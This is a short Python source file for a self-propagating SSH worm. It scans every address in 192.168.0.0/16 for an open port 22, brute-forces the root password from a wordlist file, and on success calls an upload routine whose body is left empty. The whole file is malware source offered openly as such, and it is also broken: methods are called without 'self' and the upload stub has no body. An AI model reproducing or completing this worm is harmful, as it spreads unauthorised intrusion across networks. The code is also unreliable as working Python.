import paramiko
import os
import socket

class Worm:
    def __init__(self):
        ips = generate_ips()
        for ip in ips:
            ret = is_ssh_running(ip)
            if ret:
                attack(ip)

    def generate_ips(self):
        initial = '192.168.'
        return_list = []
        for i in range(1,256):
            copy = initial
            copy += str(i) + '.'
            for j in range(1,256):
                copy2 = copy
                copy2 += str(j)
                return_list.append(copy2)
        return return_list

    def is_ssh_running(self, ipaddr):
        sock = socket.socket()
        sock.settimeout(0.5)
        try:
            sock.connect((ipaddr, 22))
        except socket.error:
            return 0
        return 1

    def attack(self, ipaddr):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for passwd in open('.list','r').readlines():
            try:
                ssh.connect(ipaddr, username='root', password=passwd)
            except paramiko.AuthenticationException:
                continue
            upload(ssh,'root',passwd)
            break

    def upload(self, sshcon, user, passw):

if __name__ == "__main__":
    w = Worm()
